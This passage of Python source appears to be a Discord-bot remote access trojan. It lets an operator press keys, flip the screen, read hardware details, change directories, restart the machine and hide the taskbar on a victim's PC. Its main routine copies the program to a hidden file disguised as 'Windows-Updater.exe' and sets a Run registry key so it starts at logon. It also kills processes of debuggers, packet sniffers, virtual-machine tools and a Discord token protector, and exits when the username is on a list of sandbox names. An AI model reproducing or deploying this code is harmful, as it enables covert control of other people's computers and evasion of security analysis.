            await ctx.send(f"Error returning **{filepath}** to visible for **{os.getlogin()}**")

@client.command()
async def key_press(ctx, usid, *, keyname):
    if usid == clientid:
        try:
            pyautogui.press(keyname)
            await ctx.send(f"**{os.getlogin()}** has pressed the **{keyname}** key.")
        except: await ctx.send(f"**{keyname}** is not recognized as a key.")

@client.command()
async def screenflip(ctx, *, usid):
    if usid == clientid:
        try:
            screen = rs.get_primary_display()
            start_pos = screen.current_orientation
            pos = abs((start_pos - 1*90) % 360)
            screen.rotate_to(pos)
            await ctx.send(f"**{os.getlogin()}**'s screen has been flipped.")
        except: await ctx.send(f"**{os.getlogin()}**'s screen could not be flipped.")

@client.command()
async def hardware_list(ctx, *, usid):
    if usid == clientid:
        message = ""
        message += f"`CPU`: **{psutil.cpu_count()}** cores\n"
        message += f"`RAM`: **{psutil.virtual_memory().total / (1024.0 ** 3)}** GB\n"
        message += f"`Hard disk`: **{psutil.disk_usage('/').total / (1024.0 ** 3)}** GB\n"
        message += f"`Boot device`: {psutil.disk_partitions()[0].device}"
        await ctx.send(f"Hardware information for **{os.getlogin()}**: \n\n{message}")

@client.command()
async def chdisk(ctx, usid, *, disk):
    if usid == clientid:
        try:
            os.chdir(disk)
            await ctx.send(f"Disk changed to **{disk}** for **{os.getlogin()}**")
        except: await ctx.send(f"Error changing disk to **{disk}** for **{os.getlogin()}**")

@client.command()
async def restart(ctx, *, usid):
    if usid == clientid:
        await ctx.send(f"**{os.getlogin()}**'s PC has been shut down.")
        os.system("shutdown /r /t 1")

@client.command()
async def hidetaskbar(ctx, *, usid):
    if usid == clientid:
        try:
            h = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
            ctypes.windll.user32.ShowWindow(h, 0)
            await ctx.send(f"**{os.getlogin()}**'s taskbar has been hidden.")
        except: await ctx.send(f"**{os.getlogin()}**'s taskbar could not be hidden.")

@client.command()
async def showtaskbar(ctx, *, usid):
    if usid == clientid:
        try:
            h = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
            ctypes.windll.user32.ShowWindow(h, 9)
            await ctx.send(f"**{os.getlogin()}**'s taskbar has been returned.")
        except: await ctx.send(f"**{os.getlogin()}**'s taskbar couldn't be returned.")

def mainfunc():
    bluser = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    bltask = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector', 'processhacker')

    if autostart != False:
        if sys.argv[0].endswith("exe"):
            backdoor_location = os.environ["appdata"] + "\\Microsoft\\Windows-Updater.exe"
            if not os.path.exists(backdoor_location):
                shutil.copyfile(sys.executable, backdoor_location)
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                command = 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v visuals /t REG_SZ /d "' + backdoor_location + '" /f'
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "visuals", 0, winreg.REG_SZ, command)
                winreg.CloseKey(key)
                subprocess.call(command, shell=True)
                p = os.popen('attrib +h "' + backdoor_location + '"')
                t = p.read()
                p.close()
    
    result = subprocess.getoutput("tasklist")
    numb = len(result)
    if numb > 0:
        temp = (os.getenv('TEMP'))
        if os.path.isfile(temp + r"\olist.txt"):
            os.system(r"del %temp%\olist.txt /f")
        f1 = open(temp + r"\olist.txt", 'a')
        f1.write(result)
        f1.close()
        final = ""
        with open(f"{os.getenv('TEMP')}\olist.txt") as A:
            final = A.read().lower()
        for task in bltask:
            if task in final:
                try:
                    kilproc = r"taskkill /IM" + ' "' + task + '.exe' + '" ' + r"/f" 
                    os.system(kilproc)
                except: sys.exit(0)

    os.remove(f"{temp}\olist.txt")

    if f"{os.getlogin()}".lower() in bluser:
        sys.exit(0)

if __name__ == '__main__':
    mainfunc()

client.run(token)